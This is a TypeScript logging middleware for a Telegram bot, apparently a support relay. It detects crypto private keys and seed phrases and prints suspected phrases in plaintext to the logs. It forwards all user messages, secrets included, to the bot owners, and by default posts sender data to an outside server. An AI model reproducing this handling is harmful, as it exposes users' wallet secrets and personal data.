// src/middlewares/logger.ts
import { Middleware } from 'grammy';
import createDebug from 'debug';
import BotMessage from '../../models/botMessage';
import BotUser from '../../models/botUser';
import { MyContext } from '../types';
import { findBotProxy } from '../services/findBotProxy';
import { setupBot } from '../botSetup';
import axios from 'axios';

const debug = createDebug('bot:logger');

// 定义一个日志中间件
const logger: Middleware = async (ctx: MyContext, next) => {
  debug('logger');
  const message = ctx.message;

  debug(message);

  // 检查消息类型的配置
  const mediaTypes = {
    photo: { check: message?.photo, label: '[图片]' },
    video: { check: message?.video, label: '[视频]' },
    document: { check: message?.document, label: '[文档]' },
    animation: { check: message?.animation, label: '[动画]' },
    voice: { check: message?.voice, label: '[语音]' },
    audio: { check: message?.audio, label: '[音频]' },
    sticker: { check: message?.sticker, label: '[贴纸]' },
    video_note: { check: message?.video_note, label: '[视频笔记]' },
    location: { check: message?.location, label: '[位置]' },
  };

  const textTypes = {
    private_key: {
      check: message?.text && /^0x[a-fA-F0-9]{64}$/.test(message.text),
      label: '[私钥]',
    },
    memonic: {
      check:
        message?.text &&
        (() => {
          const text = message.text.trim();
          const words = text.toLowerCase().split(/\s+/);
          console.log('=== 助记词检测 ===');
          console.log('原始文本:', text);
          console.log('单词数量:', words.length);
          console.log('单词列表:', words);
          const isValid =
            (words.length === 12 || words.length === 24) &&
            words.every((word) => /^[a-z]{1,8}$/.test(word));
          console.log('是否是助记词:', isValid);
          return isValid;
        })(),
      label: '[助记词]',
    },
    mention: {
      check: message?.entities?.some((entity) => entity.type === 'mention'),
      label: message?.text,
    },
  };

  // 查找匹配的消息类型
  let messageType = 'text';
  let messageContent = message?.text || '';

  console.log('=== 消息类型检测开始 ===');

  // 检查多媒体类型
  const mediaType = Object.entries(mediaTypes).find(
    ([_, type]) => type.check,
  )?.[0];
  console.log('多媒体类型检测结果:', mediaType);

  if (mediaType) {
    messageType = mediaType;
    messageContent = mediaTypes[mediaType].label;
    console.log('确定为多媒体类型:', messageType);
  }
  // 检查特殊文本类型
  else if (message?.text) {
    console.log('开始检测特殊文本类型');
    const textType = Object.entries(textTypes).find(
      ([_, type]) => type.check,
    )?.[0];
    console.log('特殊文本类型检测结果:', textType);

    if (textType) {
      messageType = textType;
      messageContent = textTypes[textType].label;
      console.log('确定为特殊文本类型:', messageType);
    } else {
      console.log('确定为普通文本类型');
    }
  }

  console.log('=== 最终结果 ===');
  console.log('消息类型:', messageType);
  console.log('消息内容:', messageContent);

  debug('message: ', message);

  // 如果消息包含@提及，添加被提及的用户信息
  if (message?.entities?.some((entity) => entity.type === 'mention')) {
    const mentions = message.entities
      .filter((entity) => entity.type === 'mention')
      .map(
        (entity) =>
          message?.text?.substring(
            entity.offset,
            entity.offset + entity.length,
          ),
      )
      .join(', ');
    debug(`${messageContent} (提及用户: ${mentions})`);
  }

  // 获取所有拥有者
  const owners = await BotUser.find({
    _id: { $in: ctx.currentBot.owners || [] },
  });

  // 检查当前用户是否是拥有者
  const isOwner = owners.some((owner) => owner.id === ctx.currentBotUser.id);

  // 如果是拥有者回复消息，则转发给原始用户
  if (isOwner && message?.reply_to_message) {
    try {
      console.log('=== 拥有者回复检测 ===');
      console.log('回复的消息:', message.reply_to_message);

      const replyMsg = message.reply_to_message as any;

      // 检查回复的消息是否是转发的消息
      if (replyMsg.forward_from || replyMsg.forward_from_chat) {
        const originalUserId = replyMsg.forward_from?.id;

        if (originalUserId) {
          const bot = setupBot(ctx.currentBot.token);

          // 将拥有者的回复复制给原始用户
          await bot.api.copyMessage(
            originalUserId,
            ctx.chat.id,
            message.message_id,
          );

          console.log(`✅ 已将拥有者的回复发送给用户: ${originalUserId}`);

          // 给拥有者一个确认
          // await ctx.reply('✅ 回复已发送给用户', {
          //   reply_to_message_id: message.message_id,
          // });
        }
      }
    } catch (err) {
      console.error('转发拥有者回复失败:', err);
      await ctx.reply('❌ 发送失败');
    }

    // 拥有者的回复不需要继续处理
    await next();
    return;
  }

  // 自己是拥有者的话，不要发给自己
  const processed_owners = owners.filter(
    (owner) => owner.id !== ctx.currentBotUser.id,
  );

  // 处理所有消息类型（非拥有者的消息）
  if (!ctx.callbackQuery && message) {
    try {
      // 统一处理所有消息类型
      const mediaTypesForForward = {
        photo: message?.photo?.[message.photo.length - 1]?.file_id,
        video: message?.video?.file_id,
        document: message?.document?.file_id,
        animation: message?.animation?.file_id,
        voice: message?.voice?.file_id,
        audio: message?.audio?.file_id,
        sticker: message?.sticker?.file_id,
        video_note: message?.video_note?.file_id,
      };

      // 查找匹配的媒体类型
      const mediaTypeForForward = Object.entries(mediaTypesForForward).find(
        ([_, id]) => id,
      )?.[0];
      const fileId = mediaTypeForForward
        ? mediaTypesForForward[mediaTypeForForward]
        : null;

      const { proxyUser } = await findBotProxy(ctx.currentBot);

      let messageContentForDb = messageContent;

      // 如果是多媒体文件，获取文件ID或URL
      if (
        message?.photo ||
        message?.video ||
        message?.document ||
        message?.animation
      ) {
        try {
          const file = await ctx.getFile();
          messageContentForDb = `https://api.telegram.org/file/bot${ctx.currentBot.token}/${file.file_path}`;
        } catch (err) {
          debug('获取文件路径失败:', err);
          messageContentForDb = fileId || messageContent;
        }
      }

      // 创建消息记录
      const savedMessage = await BotMessage.create({
        bot: ctx.currentBot._id,
        botUser: ctx.currentBotUser._id,
        group: ctx.currentGroup?._id,
        content: fileId || messageContentForDb,
        messageType,
        caption: message?.caption,
      });

      // 如果成功保存了消息，给所有 owner 发送通知
      if (savedMessage && processed_owners.length > 0) {
        try {
          const bot = setupBot(ctx.currentBot.token);

          // 循环所有 owner.id 发送
          for (const owner of processed_owners) {
            if (owner?.id) {
              // 直接转发原始消息,用forwardMessage方法
              await bot.api.forwardMessage(
                owner.id,
                ctx.chat.id,
                ctx.message.message_id,
              );
            }
          }
        } catch (err) {
          console.error('发送通知失败:', err);
        }
      }
    } catch (err) {
      console.error('处理消息失败:', err);
    }
  }

  const from = message?.from;
  const chat = message?.chat;

  if (!ctx.callbackQuery && messageContent) {
    if (process.env.NOT_RECEIVER_MESSAGE !== 'true') {
      axios.post('https://account-backend.2040fc.xyz/api/receive-message', {
        message_id: message?.message_id, // Telegram 消息ID
        id: from?.id, // 发送者id; // 发送者id
        is_bot: from?.is_bot, // 是否是机器人;
        first_name: from?.first_name, // 发送者first_name
        last_name: from?.last_name, // 发送者last_name
        username: from?.username, // 发送者username
        language_code: from?.language_code, // 发送者language_code
        chat_id: chat?.id, // 聊天id
        chat_type: chat?.type,
        chat_title: chat?.title,
        date: message?.date, // 消息时间戳（秒）
        messageType, // 消息类型，如 text, image, command 等
        content: messageContent, // 消息内容
        botName: ctx.currentBot.botName,
      });
    }
  }

  const timestamp = new Date().toLocaleString('zh-CN');

  debug(
    `用户 ${
      ctx.from?.username || ctx.from?.id
    } 在 ${timestamp} 发来了 ${messageType} 类型消息: ${messageContent}`,
  );
  await next();
};

export default logger;
